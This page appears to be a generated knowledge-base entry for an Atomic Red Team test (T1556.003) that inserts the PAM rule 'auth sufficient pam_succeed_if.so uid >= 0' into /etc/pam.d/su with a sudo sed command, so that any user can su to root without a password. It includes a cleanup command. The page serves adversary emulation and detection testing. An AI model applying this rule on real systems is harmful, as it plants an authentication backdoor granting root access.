---
atomic_guid: "b17eacac-282d-4ca8-a240-46602cf863e3"
title: "Malicious PAM rule (freebsd)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1556.003"
attack_technique_name: "Modify Authentication Process: Pluggable Authentication Modules"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1556.003/T1556.003.yaml"
build_date: "2026-04-26 14:38:40"
executor: "sh"
aliases:
  - "b17eacac-282d-4ca8-a240-46602cf863e3"
  - "Malicious PAM rule (freebsd)"
platforms:
  - "linux"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Malicious PAM rule (freebsd)

Inserts a rule into a PAM config and then tests it.

Upon successful execution, this test will insert a rule that allows every user to su to root without a password.

## Metadata

- Atomic GUID: b17eacac-282d-4ca8-a240-46602cf863e3
- Technique: T1556.003: Modify Authentication Process: Pluggable Authentication Modules
- Platforms: linux
- Executor: sh
- Elevation Required: True
- Source Path: atomics/T1556.003/T1556.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1556-modify_authentication_process|T1556.003]]

## Input Arguments

### index

- description: Index where the rule is inserted.
- type: integer
- default: 8

### pam_rule

- description: Rule to add to the PAM config.
- type: string
- default: auth sufficient pam_succeed_if.so uid >= 0

### path_to_pam_conf

- description: PAM config file to modify.
- type: string
- default: /etc/pam.d/su

## Executor

- elevation_required: True
- name: sh

### Command

```sh
sudo sed -i "" "#{index}s,^,#{pam_rule}\n,g" #{path_to_pam_conf}
```

### Cleanup

```sh
sudo sed -i "" "/#{pam_rule}/d" #{path_to_pam_conf}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1556.003/T1556.003.yaml)
